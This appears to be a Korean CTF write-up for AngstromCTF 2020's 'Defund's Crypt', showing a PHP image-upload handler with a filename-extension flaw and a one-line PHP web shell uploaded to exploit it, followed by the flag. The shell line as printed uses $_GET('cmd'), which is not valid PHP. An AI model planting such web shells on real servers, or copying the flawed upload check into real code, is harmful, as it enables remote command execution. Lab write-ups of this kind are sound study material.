---
title: "Angstromctf2020 - Defund's Crypt"
header:
  teaser: ""
categories:
  - CTF
tags:
  - Angstromctf2020
  - CTF
toc: true
---


# Defund's Crypt
---
![](../assets/img/Pasted%20image%2020240330203013.png)
![](../assets/img/Pasted%20image%2020240330203020.png)

소스코드가 제공된다.
```php
//src.php
<?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        // I just copy pasted this from the PHP site then modified it a bit
        // I'm not gonna put myself through the hell of learning PHP to write one lousy angstrom chall
        try {
            if (
                !isset($_FILES['imgfile']['error']) ||
                is_array($_FILES['imgfile']['error'])
            ) {
                throw new RuntimeException('The crypt rejects you.');
            }
            switch ($_FILES['imgfile']['error']) {
                case UPLOAD_ERR_OK:
                    break;
                case UPLOAD_ERR_NO_FILE:
                    throw new RuntimeException('You must leave behind a memory lest you be forgotten forever.');
                case UPLOAD_ERR_INI_SIZE:
                case UPLOAD_ERR_FORM_SIZE:
                    throw new RuntimeException('People can only remember so much.');
                default:
                    throw new RuntimeException('The crypt rejects you.');
            }
            if ($_FILES['imgfile']['size'] > 1000000) {
                throw new RuntimeException('People can only remember so much..');
            }
            $finfo = new finfo(FILEINFO_MIME_TYPE);
            if (false === $ext = array_search(
                $finfo->file($_FILES['imgfile']['tmp_name']),
                array(
                    '.jpg' => 'image/jpeg',
                    '.png' => 'image/png',
                    '.bmp' => 'image/bmp',
                ),
                true
            )) {
                throw new RuntimeException("Your memory isn't picturesque enough to be remembered.");
            }
            if (strpos($_FILES["imgfile"]["name"], $ext) === false) {
                throw new RuntimeException("The name of your memory doesn't seem to match its content.");
            }
            $bname = basename($_FILES["imgfile"]["name"]);
            $fname = sprintf("%s%s", sha1_file($_FILES["imgfile"]["tmp_name"]), substr($bname, strpos($bname, ".")));
            if (!move_uploaded_file(
                $_FILES['imgfile']['tmp_name'],
                "./memories/" . $fname
            )) {
                throw new RuntimeException('Your memory failed to be remembered.');
            }
            http_response_code(301);
            header("Location: /memories/" . $fname);
        } catch (RuntimeException $e) {
            echo "<p>" . $e->getMessage() . "</p>";
        }
    }
?>
```

별다른 필터링이 존재하지 않아서 그냥 웹쉘 형태로 php파일을 업로드했다.  
```php
<?php system($_GET('cmd')); ?>
```
 ![](../assets/img/Pasted%20image%2020240330203029.png)

```text
actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}
```
